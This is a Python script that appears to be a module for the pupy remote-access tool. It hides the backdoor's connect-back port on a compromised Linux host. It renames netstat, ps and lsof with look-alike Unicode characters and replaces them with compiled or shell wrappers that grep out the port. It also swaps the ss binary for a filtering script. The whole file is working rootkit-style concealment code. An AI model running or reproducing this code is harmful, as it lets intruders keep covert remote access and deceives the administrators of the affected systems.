#!/usr/bin/env python

import sys
import subprocess
import os
import time


def run(port=None):
    if port is None:
        try:
            import pupy
            host, port=pupy.get_connect_back_host().split(":")
        except:
            raise Exception("pupy connect back port couldn't be found, please precise it manually")

    print "hidding port %s ..."%port

    a=subprocess.check_output(["netstat", "-tn"])
    if port in a:
        def cmd_exists(cmd):
            return subprocess.call("type " + cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0
        if cmd_exists("gcc") == True:
            bash=r"""which netstat ps lsof|perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,"|gcc -xc - -o$o";print F qq{int main(int a,char**b){char*c[999999]={"sh","-c","$_ \$*|grep -vE \\"""+'"'+port+"""|\$\$|[$s-$n]|grep\\\\""};memcpy(c+3,b,8*a);execv("/bin/sh",c);}}'"""
            with open('/tmp/b', 'w') as f:
                f.write(bash)
                f.close()
            os.system("bash /tmp/b")
            time.sleep(3)
            os.remove("/tmp/b")
        else:
            bash=r"""which netstat ps lsof |perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,">$o";print F"#!/bin/sh\n$_ \$*|grep -vE \"[$s-$n]|grep|"""+port+"""\\\\"";chmod 493,$o'"""
            with open("/tmp/p", "w") as f:
                f.write(bash)
                f.close()
            os.system("bash /tmp/p")
            time.sleep(3)
            os.remove("/tmp/p")
        bashss="""#!/bin/bash
/bin/zss $* | grep -v """+port
        get_ss_path=subprocess.check_output('which ss', shell=True)
        path=get_ss_path[:-3]
        os.system("mv "+path+"ss "+path+"zss")
        with open(path+"ss", "w") as newss:
            newss.write(bashss)
            newss.close()
        os.system("chmod +x "+path+"ss")
    else:
        print "port is already hidden"
